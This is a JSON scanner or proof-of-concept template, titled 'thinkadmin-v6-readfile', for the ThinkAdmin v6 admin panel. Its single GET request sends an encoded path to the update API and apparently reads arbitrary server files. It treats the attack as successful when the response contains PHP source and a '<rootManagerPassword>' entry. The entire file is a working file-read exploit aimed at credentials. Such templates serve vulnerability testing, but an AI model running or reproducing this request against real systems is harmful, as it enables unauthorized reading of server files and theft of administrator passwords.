{
    "Name": "thinkadmin-v6-readfile",
    "Description": "thinkadmin-v6-readfile",
    "Product": "thinkadmin",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "PD9waH"
                },{
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "<rootManagerPassword>"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}

